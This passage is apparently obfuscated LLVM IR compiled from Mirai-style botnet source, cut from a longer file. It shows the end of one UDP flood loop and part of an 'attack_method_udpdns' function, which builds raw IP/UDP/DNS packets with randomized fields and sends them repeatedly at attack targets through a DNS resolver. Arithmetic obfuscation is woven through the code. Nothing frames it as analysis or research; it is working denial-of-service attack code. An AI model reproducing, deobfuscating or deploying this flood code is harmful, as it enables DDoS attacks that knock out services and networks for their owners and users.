  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 8
  store i32 %162, i32* %164, align 4
  %165 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %166 = load i32, i32* %9, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i64 %167
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i32 0, i32 1
  %170 = load i32, i32* %169, align 4
  %171 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 9
  store i32 %170, i32* %172, align 4
  %173 = load i16, i16* %16, align 2
  %174 = call zeroext i16 @htons(i16 zeroext %173) #7
  %175 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %176 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %175, i32 0, i32 0
  store i16 %174, i16* %176, align 2
  %177 = load i16, i16* %17, align 2
  %178 = call zeroext i16 @htons(i16 zeroext %177) #7
  %179 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %180 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %179, i32 0, i32 1
  store i16 %178, i16* %180, align 2
  %181 = load i32, i32* %19, align 4
  %182 = sext i32 %181 to i64
  %183 = sub i64 0, 12
  %184 = sub i64 0, %182
  %185 = add i64 %183, %184
  %186 = sub i64 0, %185
  %187 = add i64 12, %182
  %188 = trunc i64 %186 to i16
  %189 = call zeroext i16 @htons(i16 zeroext %188) #7
  %190 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %191 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %190, i32 0, i32 2
  store i16 %189, i16* %191, align 2
  %192 = load i8*, i8** %22, align 8
  %193 = bitcast i8* %192 to i32*
  store i32 -1, i32* %193, align 4
  %194 = load i8*, i8** %22, align 8
  %195 = getelementptr inbounds i8, i8* %194, i64 4
  store i8* %195, i8** %22, align 8
  %196 = load i8*, i8** %22, align 8
  %197 = load i8*, i8** %18, align 8
  %198 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %196, i8* %197, i32 %198)
  br label %199

; <label>:199:                                    ; preds = %159
  %200 = load i32, i32* %9, align 4
  %201 = add i32 %200, -782866473
  %202 = add i32 %201, 1
  %203 = sub i32 %202, -782866473
  %204 = add nsw i32 %200, 1
  store i32 %203, i32* %9, align 4
  br label %68

; <label>:205:                                    ; preds = %68
  br label %206

; <label>:206:                                    ; preds = %342, %205
  store i32 0, i32* %9, align 4
  br label %207

; <label>:207:                                    ; preds = %337, %206
  %208 = load i32, i32* %9, align 4
  %209 = load i8, i8* %5, align 1
  %210 = zext i8 %209 to i32
  %211 = icmp slt i32 %208, %210
  br i1 %211, label %212, label %342

; <label>:212:                                    ; preds = %207
  %213 = load i8**, i8*** %11, align 8
  %214 = load i32, i32* %9, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds i8*, i8** %213, i64 %215
  %217 = load i8*, i8** %216, align 8
  store i8* %217, i8** %23, align 8
  %218 = load i8*, i8** %23, align 8
  %219 = bitcast i8* %218 to %struct.iphdr*
  store %struct.iphdr* %219, %struct.iphdr** %24, align 8
  %220 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i64 1
  %222 = bitcast %struct.iphdr* %221 to %struct.udphdr*
  store %struct.udphdr* %222, %struct.udphdr** %25, align 8
  %223 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %224 = load i32, i32* %9, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %223, i64 %225
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %226, i32 0, i32 2
  %228 = load i8, i8* %227, align 4
  %229 = zext i8 %228 to i32
  %230 = icmp slt i32 %229, 32
  br i1 %230, label %231, label %256

; <label>:231:                                    ; preds = %212
  %232 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %233 = load i32, i32* %9, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %232, i64 %234
  %236 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %235, i32 0, i32 1
  %237 = load i32, i32* %236, align 4
  %238 = call i32 @ntohl(i32 %237) #7
  %239 = call i32 @rand_next()
  %240 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %241 = load i32, i32* %9, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %240, i64 %242
  %244 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %243, i32 0, i32 2
  %245 = load i8, i8* %244, align 4
  %246 = zext i8 %245 to i32
  %247 = lshr i32 %239, %246
  %248 = sub i32 0, %238
  %249 = sub i32 0, %247
  %250 = add i32 %248, %249
  %251 = sub i32 0, %250
  %252 = add i32 %238, %247
  %253 = call i32 @htonl(i32 %251) #7
  %254 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 9
  store i32 %253, i32* %255, align 4
  br label %256

; <label>:256:                                    ; preds = %231, %212
  %257 = load i16, i16* %13, align 2
  %258 = zext i16 %257 to i32
  %259 = icmp eq i32 %258, 65535
  br i1 %259, label %260, label %265

; <label>:260:                                    ; preds = %256
  %261 = call i32 @rand_next()
  %262 = trunc i32 %261 to i16
  %263 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 3
  store i16 %262, i16* %264, align 4
  br label %265

; <label>:265:                                    ; preds = %260, %256
  %266 = load i16, i16* %16, align 2
  %267 = zext i16 %266 to i32
  %268 = icmp eq i32 %267, 65535
  br i1 %268, label %269, label %274

; <label>:269:                                    ; preds = %265
  %270 = call i32 @rand_next()
  %271 = trunc i32 %270 to i16
  %272 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %273 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %272, i32 0, i32 0
  store i16 %271, i16* %273, align 2
  br label %274

; <label>:274:                                    ; preds = %269, %265
  %275 = load i16, i16* %17, align 2
  %276 = zext i16 %275 to i32
  %277 = icmp eq i32 %276, 65535
  br i1 %277, label %278, label %283

; <label>:278:                                    ; preds = %274
  %279 = call i32 @rand_next()
  %280 = trunc i32 %279 to i16
  %281 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 1
  store i16 %280, i16* %282, align 2
  br label %283

; <label>:283:                                    ; preds = %278, %274
  %284 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 7
  store i16 0, i16* %285, align 2
  %286 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %287 = bitcast %struct.iphdr* %286 to i16*
  %288 = call zeroext i16 @checksum_generic(i16* %287, i32 20)
  %289 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 7
  store i16 %288, i16* %290, align 2
  %291 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %292 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %291, i32 0, i32 3
  store i16 0, i16* %292, align 2
  %293 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %294 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %295 = bitcast %struct.udphdr* %294 to i8*
  %296 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %297 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %296, i32 0, i32 2
  %298 = load i16, i16* %297, align 2
  %299 = load i32, i32* %19, align 4
  %300 = sext i32 %299 to i64
  %301 = sub i64 0, 12
  %302 = sub i64 0, %300
  %303 = add i64 %301, %302
  %304 = sub i64 0, %303
  %305 = add i64 12, %300
  %306 = trunc i64 %304 to i32
  %307 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %293, i8* %295, i16 zeroext %298, i32 %306)
  %308 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %309 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %308, i32 0, i32 3
  store i16 %307, i16* %309, align 2
  %310 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %311 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %310, i32 0, i32 1
  %312 = load i16, i16* %311, align 2
  %313 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %314 = load i32, i32* %9, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i64 %315
  %317 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %316, i32 0, i32 0
  %318 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %317, i32 0, i32 1
  store i16 %312, i16* %318, align 2
  %319 = load i32, i32* %10, align 4
  %320 = load i8*, i8** %23, align 8
  %321 = load i32, i32* %19, align 4
  %322 = sext i32 %321 to i64
  %323 = sub i64 32, 424188218619698228
  %324 = add i64 %323, %322
  %325 = add i64 %324, 424188218619698228
  %326 = add i64 32, %322
  %327 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %328 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %329 = load i32, i32* %9, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %328, i64 %330
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %331, i32 0, i32 0
  %333 = bitcast %struct.sockaddr_in* %332 to %struct.sockaddr*
  store %struct.sockaddr* %333, %struct.sockaddr** %327, align 8
  %334 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %335 = load %struct.sockaddr*, %struct.sockaddr** %334, align 8
  %336 = call i64 @sendto(i32 %319, i8* %320, i64 %325, i32 16384, %struct.sockaddr* %335, i32 16)
  br label %337

; <label>:337:                                    ; preds = %283
  %338 = load i32, i32* %9, align 4
  %339 = sub i32 0, 1
  %340 = sub i32 %338, %339
  %341 = add nsw i32 %338, 1
  store i32 %340, i32* %9, align 4
  br label %207

; <label>:342:                                    ; preds = %207
  br label %206

; <label>:343:                                    ; preds = %64, %58
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpdns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 8) #6
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 2, i32 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 3, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 4, i32 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 5, i32 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 6, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 7, i32 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 9, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 0, i32 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 8, i8* null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  %79 = icmp eq i8* %78, null
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %4
  br label %530

; <label>:81:                                     ; preds = %4
  %82 = load i8*, i8** %20, align 8
  %83 = call i32 @util_strlen(i8* %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %81
  br label %530

; <label>:87:                                     ; preds = %81
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %530

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %338, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %345

; <label>:101:                                    ; preds = %96
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %102 = call noalias i8* @calloc(i64 600, i64 1) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %26, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.udphdr*
  store %struct.udphdr* %115, %struct.udphdr** %27, align 8
  %116 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %117 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %116, i64 1
  %118 = bitcast %struct.udphdr* %117 to %struct.dnshdr*
  store %struct.dnshdr* %118, %struct.dnshdr** %28, align 8
  %119 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %120 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %119, i64 1
  %121 = bitcast %struct.dnshdr* %120 to i8*
  store i8* %121, i8** %29, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = xor i8 %124, -1
  %126 = xor i8 15, -1
  %127 = xor i8 63, -1
  %128 = or i8 %125, %126
  %129 = or i8 63, %127
  %130 = xor i8 %128, -1
  %131 = and i8 %130, %129
  %132 = and i8 %124, 15
  %133 = xor i8 %131, -1
  %134 = xor i8 64, -1
  %135 = xor i8 92, -1
  %136 = and i8 %133, 92
  %137 = and i8 %131, %135
  %138 = and i8 %134, 92
  %139 = and i8 64, %135
  %140 = or i8 %136, %137
  %141 = or i8 %138, %139
  %142 = xor i8 %140, %141
  %143 = or i8 %133, %134
  %144 = xor i8 %143, -1
  %145 = or i8 92, %135
  %146 = and i8 %144, %145
  %147 = or i8 %142, %146
  %148 = or i8 %131, 64
  store i8 %147, i8* %123, align 4
  %149 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = xor i8 %151, -1
  %153 = xor i8 -16, -1
  %154 = xor i8 0, -1
  %155 = or i8 %152, %153
  %156 = or i8 0, %154
  %157 = xor i8 %155, -1
  %158 = and i8 %157, %156
  %159 = and i8 %151, -16
  %160 = xor i8 %158, -1
  %161 = xor i8 5, -1
  %162 = xor i8 112, -1
  %163 = and i8 %160, 112
  %164 = and i8 %158, %162
  %165 = and i8 %161, 112
  %166 = and i8 5, %162
  %167 = or i8 %163, %164
  %168 = or i8 %165, %166
  %169 = xor i8 %167, %168
  %170 = or i8 %160, %161
  %171 = xor i8 %170, -1
  %172 = or i8 112, %162
  %173 = and i8 %171, %172
  %174 = or i8 %169, %173
  %175 = or i8 %158, 5
  store i8 %174, i8* %150, align 4
  %176 = load i8, i8* %12, align 1
  %177 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 1
  store i8 %176, i8* %178, align 1
  %179 = load i8, i8* %19, align 1
  %180 = zext i8 %179 to i64
  %181 = sub i64 41, 5075915711649822632
  %182 = add i64 %181, %180
  %183 = add i64 %182, 5075915711649822632
  %184 = add i64 41, %180
  %185 = sub i64 %183, 1424537874642921697
  %186 = add i64 %185, 2
  %187 = add i64 %186, 1424537874642921697
  %188 = add i64 %183, 2
  %189 = load i32, i32* %21, align 4
  %190 = sext i32 %189 to i64
  %191 = add i64 %187, 2882912776902212575
  %192 = add i64 %191, %190
  %193 = sub i64 %192, 2882912776902212575
  %194 = add i64 %187, %190
  %195 = add i64 %193, -5348963301232601664
  %196 = add i64 %195, 4
  %197 = sub i64 %196, -5348963301232601664
  %198 = add i64 %193, 4
  %199 = trunc i64 %197 to i16
  %200 = call zeroext i16 @htons(i16 zeroext %199) #7
  %201 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 2
  store i16 %200, i16* %202, align 2
  %203 = load i16, i16* %13, align 2
  %204 = call zeroext i16 @htons(i16 zeroext %203) #7
  %205 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 3
  store i16 %204, i16* %206, align 4
  %207 = load i8, i8* %14, align 1
  %208 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 5
  store i8 %207, i8* %209, align 4
  %210 = load i8, i8* %15, align 1
  %211 = icmp ne i8 %210, 0
  br i1 %211, label %212, label %216

; <label>:212:                                    ; preds = %101
  %213 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 4
  store i16 %213, i16* %215, align 2
  br label %216

; <label>:216:                                    ; preds = %212, %101
  %217 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 6
  store i8 17, i8* %218, align 1
  %219 = load i32, i32* @LOCAL_ADDR, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 8
  store i32 %219, i32* %221, align 4
  %222 = load i32, i32* %22, align 4
  %223 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 9
  store i32 %222, i32* %224, align 4
  %225 = load i16, i16* %16, align 2
  %226 = call zeroext i16 @htons(i16 zeroext %225) #7
  %227 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %228 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %227, i32 0, i32 0
  store i16 %226, i16* %228, align 2
  %229 = load i16, i16* %17, align 2
  %230 = call zeroext i16 @htons(i16 zeroext %229) #7
  %231 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %232 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %231, i32 0, i32 1
  store i16 %230, i16* %232, align 2
  %233 = load i8, i8* %19, align 1
  %234 = zext i8 %233 to i64
  %235 = sub i64 0, %234
  %236 = sub i64 21, %235
  %237 = add i64 21, %234
  %238 = sub i64 0, %236
  %239 = sub i64 0, 2
  %240 = add i64 %238, %239
  %241 = sub i64 0, %240
  %242 = add i64 %236, 2
  %243 = load i32, i32* %21, align 4
  %244 = sext i32 %243 to i64
  %245 = sub i64 0, %244
  %246 = sub i64 %241, %245
  %247 = add i64 %241, %244
  %248 = sub i64 0, %246
  %249 = sub i64 0, 4
  %250 = add i64 %248, %249
  %251 = sub i64 0, %250
  %252 = add i64 %246, 4
  %253 = trunc i64 %251 to i16
  %254 = call zeroext i16 @htons(i16 zeroext %253) #7
  %255 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %256 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %255, i32 0, i32 2
  store i16 %254, i16* %256, align 2
  %257 = load i16, i16* %18, align 2
  %258 = call zeroext i16 @htons(i16 zeroext %257) #7
  %259 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %260 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %259, i32 0, i32 0
  store i16 %258, i16* %260, align 2
  %261 = call zeroext i16 @htons(i16 zeroext 256) #7
  %262 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %263 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %262, i32 0, i32 1
  store i16 %261, i16* %263, align 2
  %264 = call zeroext i16 @htons(i16 zeroext 1) #7
  %265 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %266 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %265, i32 0, i32 2
  store i16 %264, i16* %266, align 2
  %267 = load i8, i8* %19, align 1
  %268 = load i8*, i8** %29, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %29, align 8
  store i8 %267, i8* %268, align 1
  %270 = load i8, i8* %19, align 1
  %271 = zext i8 %270 to i32
  %272 = load i8*, i8** %29, align 8
  %273 = sext i32 %271 to i64
  %274 = getelementptr inbounds i8, i8* %272, i64 %273
  store i8* %274, i8** %29, align 8
  %275 = load i8*, i8** %29, align 8
  store i8* %275, i8** %30, align 8
  %276 = load i8*, i8** %29, align 8
  %277 = getelementptr inbounds i8, i8* %276, i64 1
  %278 = load i8*, i8** %20, align 8
  %279 = load i32, i32* %21, align 4
  %280 = add i32 %279, 1134466124
  %281 = add i32 %280, 1
  %282 = sub i32 %281, 1134466124
  %283 = add nsw i32 %279, 1
  call void @util_memcpy(i8* %277, i8* %278, i32 %282)
  store i32 0, i32* %23, align 4
  br label %284

; <label>:284:                                    ; preds = %317, %216
  %285 = load i32, i32* %23, align 4
  %286 = load i32, i32* %21, align 4
  %287 = icmp slt i32 %285, %286
  br i1 %287, label %288, label %323

; <label>:288:                                    ; preds = %284
  %289 = load i8*, i8** %20, align 8
  %290 = load i32, i32* %23, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds i8, i8* %289, i64 %291
  %293 = load i8, i8* %292, align 1
  %294 = sext i8 %293 to i32
  %295 = icmp eq i32 %294, 46
  br i1 %295, label %296, label %310

; <label>:296:                                    ; preds = %288
  %297 = load i8, i8* %24, align 1
  %298 = load i8*, i8** %30, align 8
  store i8 %297, i8* %298, align 1
  store i8 0, i8* %24, align 1
  %299 = load i8, i8* %25, align 1
  %300 = sub i8 0, %299
  %301 = sub i8 0, 1
  %302 = add i8 %300, %301
  %303 = sub i8 0, %302
  %304 = add i8 %299, 1
  store i8 %303, i8* %25, align 1
  %305 = load i8*, i8** %29, align 8
  %306 = load i32, i32* %23, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds i8, i8* %305, i64 %307
  %309 = getelementptr inbounds i8, i8* %308, i64 1
  store i8* %309, i8** %30, align 8
  br label %316

; <label>:310:                                    ; preds = %288
  %311 = load i8, i8* %24, align 1
  %312 = add i8 %311, -62
  %313 = add i8 %312, 1
  %314 = sub i8 %313, -62
  %315 = add i8 %311, 1
  store i8 %314, i8* %24, align 1
  br label %316

; <label>:316:                                    ; preds = %310, %296
  br label %317

; <label>:317:                                    ; preds = %316
  %318 = load i32, i32* %23, align 4
  %319 = add i32 %318, -534204787
  %320 = add i32 %319, 1
  %321 = sub i32 %320, -534204787
  %322 = add nsw i32 %318, 1
  store i32 %321, i32* %23, align 4
  br label %284

; <label>:323:                                    ; preds = %284
  %324 = load i8, i8* %24, align 1
  %325 = load i8*, i8** %30, align 8
  store i8 %324, i8* %325, align 1
  %326 = load i8*, i8** %29, align 8
  %327 = load i32, i32* %21, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds i8, i8* %326, i64 %328
  %330 = getelementptr inbounds i8, i8* %329, i64 2
  %331 = bitcast i8* %330 to %struct.grehdr*
  store %struct.grehdr* %331, %struct.grehdr** %31, align 8
  %332 = call zeroext i16 @htons(i16 zeroext 1) #7
  %333 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %334 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %333, i32 0, i32 0
  store i16 %332, i16* %334, align 2
  %335 = call zeroext i16 @htons(i16 zeroext 1) #7
  %336 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %337 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %336, i32 0, i32 1
  store i16 %335, i16* %337, align 2
  br label %338

; <label>:338:                                    ; preds = %323
  %339 = load i32, i32* %9, align 4
  %340 = sub i32 0, %339
  %341 = sub i32 0, 1
  %342 = add i32 %340, %341
  %343 = sub i32 0, %342
  %344 = add nsw i32 %339, 1
  store i32 %343, i32* %9, align 4
  br label %96

; <label>:345:                                    ; preds = %96
  br label %346

; <label>:346:                                    ; preds = %529, %345
  store i32 0, i32* %9, align 4
  br label %347

; <label>:347:                                    ; preds = %523, %346
  %348 = load i32, i32* %9, align 4
  %349 = load i8, i8* %5, align 1
  %350 = zext i8 %349 to i32
  %351 = icmp slt i32 %348, %350
  br i1 %351, label %352, label %529

; <label>:352:                                    ; preds = %347
  %353 = load i8**, i8*** %11, align 8
  %354 = load i32, i32* %9, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds i8*, i8** %353, i64 %355
  %357 = load i8*, i8** %356, align 8
  store i8* %357, i8** %32, align 8
  %358 = load i8*, i8** %32, align 8
  %359 = bitcast i8* %358 to %struct.iphdr*
  store %struct.iphdr* %359, %struct.iphdr** %33, align 8
  %360 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %361 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %360, i64 1
  %362 = bitcast %struct.iphdr* %361 to %struct.udphdr*
  store %struct.udphdr* %362, %struct.udphdr** %34, align 8
  %363 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %364 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %363, i64 1
  %365 = bitcast %struct.udphdr* %364 to %struct.dnshdr*
  store %struct.dnshdr* %365, %struct.dnshdr** %35, align 8
